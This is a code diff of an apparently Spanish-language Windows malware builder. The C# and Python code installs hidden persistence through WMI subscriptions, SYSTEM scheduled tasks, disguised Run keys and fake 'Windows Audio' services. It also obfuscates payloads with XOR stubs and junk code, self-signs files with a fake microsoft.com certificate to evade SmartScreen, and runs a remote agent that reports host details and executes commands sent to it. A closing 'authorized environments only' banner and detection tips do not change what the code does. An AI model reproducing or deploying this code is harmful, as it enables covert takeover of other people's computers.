@@ -291,29 +291,29 @@ public class AdvancedPersistence
     {
         try
         {
-            string wmiScript = $@"
-$FilterName = 'WindowsUpdateMonitor_{Guid.NewGuid().ToString().Substring(0, 8)}'
-$ConsumerName = 'WindowsUpdateService_{Guid.NewGuid().ToString().Substring(0, 8)}'
+            string wmiScript = @"
+$FilterName = 'WindowsUpdateMonitor_' + (New-Guid).ToString().Substring(0, 8)
+$ConsumerName = 'WindowsUpdateService_' + (New-Guid).ToString().Substring(0, 8)
 
-$FilterArgs = @{{
+$FilterArgs = @{
     Name = $FilterName
     EventNamespace = 'root\\cimv2'
     Query = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime > 300""
-}}
+}
 
 $Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs
 
-$ConsumerArgs = @{{
+$ConsumerArgs = @{
     Name = $ConsumerName
-    CommandLineTemplate = \\""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '{payloadPath}'\\""
-}}
+    CommandLineTemplate = \""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + payloadPath + @"'\""    
+}
 
 $Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs
 
-$BindingArgs = @{{
+$BindingArgs = @{
     Filter = $Filter
     Consumer = $Consumer
-}}
+}
 
 Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs
 
@@ -329,13 +329,13 @@ Write-Output 'WMI Persistence installed successfully'
     {
         try
         {
-            string taskScript = $@"
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File \\""{payloadPath}\\""
+            string taskScript = @"
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -File \""' + payloadPath + @"\'""  
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
-Register-ScheduledTask -TaskName '{taskName}' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
-if ($?) {{ Write-Output 'Scheduled Task installed' }}
+Register-ScheduledTask -TaskName '" + taskName + @"' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue
+if ($?) { Write-Output 'Scheduled Task installed' }
 ";
 
             return ExecutePowerShellHidden(taskScript);
@@ -354,7 +354,7 @@ if ($?) {{ Write-Output 'Scheduled Task installed' }}
             if (runKey != null)
             {
                 string valueName = "OneDriveSync_" + Guid.NewGuid().ToString().Substring(0, 4);
-                runKey.SetValue(valueName, $"\\"powershell\\" -WindowStyle Hidden -ExecutionPolicy Bypass -File \\""{payloadPath}\\"");
+                runKey.SetValue(valueName, @"\""powershell\"" -WindowStyle Hidden -ExecutionPolicy Bypass -File \""" + payloadPath + @"\"");
                 runKey.Close();
             }
 
@@ -362,11 +362,10 @@ if ($?) {{ Write-Output 'Scheduled Task installed' }}
             if (IsAdministrator())
             {
                 string serviceName = "WindowsAudio_" + Guid.NewGuid().ToString().Substring(0, 4);
-                string serviceScript = $@"
-sc.exe create {serviceName} binPath= \\"\\"powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '{payloadPath}'\\"\\" start= auto
-sc.exe description {serviceName} \\"Windows Audio Service\\"
-sc.exe start {serviceName}
-";
+                string serviceScript = @"
+sc.exe create " + serviceName + @" binPath= \""\""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + payloadPath + @"'\""\"" start= auto
+sc.exe description " + serviceName + @" \""Windows Audio Service\""
+sc.exe start " + serviceName;
 
                 ExecuteCMD(serviceScript);
             }
@@ -387,11 +386,11 @@ sc.exe start {serviceName}
 
             if (!File.Exists(startupPath))
             {
-                string shortcutScript = $@"
+                string shortcutScript = @"
 $WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut('{startupPath}')
+$Shortcut = $WshShell.CreateShortcut('" + startupPath + @"')
 $Shortcut.TargetPath = 'powershell.exe'
-$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File \\""{payloadPath}\\""
+$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File \""" + payloadPath + @"\'""
 $Shortcut.WindowStyle = 7
 $Shortcut.Save()
 ";
@@ -410,7 +409,7 @@ $Shortcut.Save()
         {
             ProcessStartInfo psi = new ProcessStartInfo();
             psi.FileName = "powershell.exe";
-            psi.Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"{script}\\"";
+            psi.Arguments = @"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \""" + script + @"\"";
             psi.RedirectStandardOutput = true;
             psi.RedirectStandardError = true;
             psi.UseShellExecute = false;
@@ -430,7 +429,7 @@ $Shortcut.Save()
         {
             ProcessStartInfo psi = new ProcessStartInfo();
             psi.FileName = "cmd.exe";
-            psi.Arguments = $"/c {command}";
+            psi.Arguments = @"/c " + command;
             psi.RedirectStandardOutput = true;
             psi.UseShellExecute = false;
             psi.CreateNoWindow = true;
@@ -481,10 +480,10 @@ public class RealTimeObfuscation
         for (int i = 0; i < base64.Length; i += 4)
         {
             int length = Math.Min(4, base64.Length - i);
-            parts.Add($"\\""{base64.Substring(i, length)}\\"");
+            parts.Add("\\"" + base64.Substring(i, length) + "\\"");
         }
         
-        return $@"string {variableMap[varName]} = string.Join("""", new string[] {{ {string.Join(", ", parts)} }});";
+        return @"string " + variableMap[varName] + @" = string.Join("""", new string[] { " + string.Join(", ", parts) + @" });";
     }
     
     public static string GenerateRandomVarName(int length)
@@ -498,13 +497,13 @@ public class RealTimeObfuscation
     {
         List<string> snippets = new List<string>
         {
-            $"var {GenerateRandomVarName(8)} = {random.Next(1000, 9999)};",
-            $"if({random.Next(0, 1)} == {random.Next(2, 10)}) {{ /* Dead code */ }}",
-            $"for(int i = 0; i < {random.Next(1, 5)}; i++) {{ /* Loop */ }}",
-            $"try {{ throw new Exception(\\"Test\\"); }} catch {{ /* Ignored */ }}",
-            $"Debug.WriteLine(\\"{GenerateRandomVarName(20)}\\");",
-            $"Thread.Sleep({random.Next(1, 10)});",
-            $"Math.Sqrt({random.Next(100, 1000)});"
+            @"var " + GenerateRandomVarName(8) + @" = " + random.Next(1000, 9999) + @";",
+            @"if(" + random.Next(0, 1) + @" == " + random.Next(2, 10) + @") { /* Dead code */ }",
+            @"for(int i = 0; i < " + random.Next(1, 5) + @"; i++) { /* Loop */ }",
+            @"try { throw new Exception(""Test""); } catch { /* Ignored */ }",
+            @"Debug.WriteLine(""" + GenerateRandomVarName(20) + @""");",
+            @"Thread.Sleep(" + random.Next(1, 10) + @");",
+            @"Math.Sqrt(" + random.Next(100, 1000) + @");"
         };
         
         return string.Join("\\n", snippets.OrderBy(x => random.Next()).Take(random.Next(2, 5)));
@@ -522,17 +521,17 @@ public class RealTimeObfuscation
     
     public static string GenerateXorStub(byte[] key, string functionName)
     {
-        string keyString = string.Join(", ", key.Select(b => $"0x{b:X2}"));
+        string keyString = string.Join(", ", key.Select(b => "0x" + b.ToString("X2")));
         
-        return $@"
-private static void {functionName}(ref byte[] data)
-{{
-    byte[] key = new byte[] {{ {keyString} }};
+        return @"
+private static void " + functionName + @"(ref byte[] data)
+{
+    byte[] key = new byte[] { " + keyString + @" };
     for (int i = 0; i < data.Length; i++)
-    {{
+    {
         data[i] = (byte)(data[i] ^ key[i % key.Length]);
-    }}
-}}
+    }
+}
 ";
     }
 }
@@ -616,19 +615,16 @@ public class SmartScreenBypass
     {
         try
         {
-            // Esto requeriría acceso a un certificado válido
-            // En implementación real, se usaría signtool.exe
-            
-            string signScript = $@"
+            string signScript = @"
 $cert = Get-ChildItem -Path Cert:\\CurrentUser\\My -CodeSigningCert | Select-Object -First 1
-if ($cert) {{
-    Set-AuthenticodeSignature -FilePath '{exePath}' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
-}}
-else {{
+if ($cert) {
+    Set-AuthenticodeSignature -FilePath '" + exePath + @"' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
+}
+else {
     # Crear certificado autofirmado temporal
     $cert = New-SelfSignedCertificate -DnsName 'microsoft.com' -CertStoreLocation 'cert:\\CurrentUser\\My' -Type CodeSigningCert -NotAfter (Get-Date).AddDays(1)
-    Set-AuthenticodeSignature -FilePath '{exePath}' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
-}}
+    Set-AuthenticodeSignature -FilePath '" + exePath + @"' -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -HashAlgorithm SHA256
+}
 ";
             
             return ExecutePowerShellHidden(signScript);
@@ -642,7 +638,7 @@ else {{
         {
             ProcessStartInfo psi = new ProcessStartInfo();
             psi.FileName = "powershell.exe";
-            psi.Arguments = $"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"{script}\\"";
+            psi.Arguments = @"-ExecutionPolicy Bypass -WindowStyle Hidden -Command \""" + script + @"\"";
             psi.RedirectStandardOutput = true;
             psi.UseShellExecute = false;
             psi.CreateNoWindow = true;
@@ -866,16 +862,16 @@ namespace SilentAgentEnhanced
             string os = Environment.OSVersion.ToString();
             string arch = Environment.Is64BitOperatingSystem ? "x64" : "x86";
             
-            string handshake = $@"{{
+            string handshake = @"{{
                 ""type"": ""agent_handshake"",
-                ""session_id"": ""{{SESSION_ID}}"",
-                ""hostname"": ""{{hostname}}"",
-                ""username"": ""{{username}}"",
-                ""os"": ""{{os}}"",
-                ""arch"": ""{{arch}}"",
-                ""windows11"": {{("10.0.2" in os).ToString().ToLower()}},
-                ""pid"": {{Process.GetCurrentProcess().Id}},
-                ""integrity"": ""{{GetIntegrityLevel()}}"",
+                ""session_id"": """ + SESSION_ID + @""",
+                ""hostname"": """ + hostname + @""",
+                ""username"": """ + username + @""",
+                ""os"": """ + os + @""",
+                ""arch"": """ + arch + @""",
+                ""windows11"": " + (os.Contains("10.0.2")).ToString().ToLower() + @",
+                ""pid"": " + Process.GetCurrentProcess().Id + @",
+                ""integrity"": """ + GetIntegrityLevel() + @""",
                 ""bypass_status"": {{
                     ""amsi"": true,
                     ""etw"": true,
@@ -973,7 +969,7 @@ namespace SilentAgentEnhanced
             {{
                 ProcessStartInfo psi = new ProcessStartInfo();
                 psi.FileName = "cmd.exe";
-                psi.Arguments = $"/c {{command}}";
+                psi.Arguments = "/c " + command;
                 psi.RedirectStandardOutput = true;
                 psi.RedirectStandardError = true;
                 psi.UseShellExecute = false;
@@ -989,7 +985,7 @@ namespace SilentAgentEnhanced
             }}
             catch (Exception ex)
             {{
-                SendResponse(stream, $"Error: {{ex.Message}}");
+                SendResponse(stream, "Error: " + ex.Message);
             }}
         }}
         
@@ -998,7 +994,7 @@ namespace SilentAgentEnhanced
             try
             {{
                 int start = json.IndexOf(key) + key.Length + 3;
-                int end = json.IndexOf(""", start);
+                int end = json.IndexOf("\\"", start);
                 return json.Substring(start, end - start);
             }}
             catch
@@ -1011,7 +1007,7 @@ namespace SilentAgentEnhanced
         {{
             try
             {{
-                string response = $@"{{"response": "{EscapeJson(message)}"}}";
+                string response = @"{{""response"": """ + EscapeJson(message) + @"""}}";
                 byte[] data = Encoding.UTF8.GetBytes(response);
                 SendData(stream, data);
             }}
@@ -1021,7 +1017,7 @@ namespace SilentAgentEnhanced
         static string EscapeJson(string input)
         {{
             if (string.IsNullOrEmpty(input)) return "";
-            return input.Replace("\\", "\\\\").Replace("\"", "\\"").Replace("\n", "\\n").Replace("\r", "\\r");
+            return input.Replace("\\\\", "\\\\\\\\").Replace("\\"", "\\\\\\"").Replace("\\n", "\\\\n").Replace("\\r", "\\\\r");
         }}
         
         static void SendData(NetworkStream stream, byte[] data)
@@ -1485,11 +1481,11 @@ while ($true) {{
         print(f"[+] PowerShell mejorado generado: {output_file}")
         
         # Mostrar instrucciones
-        self._show_powershell_instructions(output_file)
+        self._show_powershell_instructions(output_file, c2_port)
         
         return output_file
     
-    def _show_powershell_instructions(self, filename):
+    def _show_powershell_instructions(self, filename, c2_port):
         """Mostrar instrucciones para PowerShell"""
         
         instructions = f'''
@@ -1520,7 +1516,7 @@ while ($true) {{
    • Monitorear WMI Event Subscriptions
    • Verificar Scheduled Tasks con nombres aleatorios
    • Buscar procesos PowerShell con argumentos ofuscados
-   • Monitorizar conexiones al puerto {self.c2_port}
+   • Monitorizar conexiones al puerto {c2_port}
 
 ⚠️  SOLO PARA ENTORNOS AUTORIZADOS
 '''
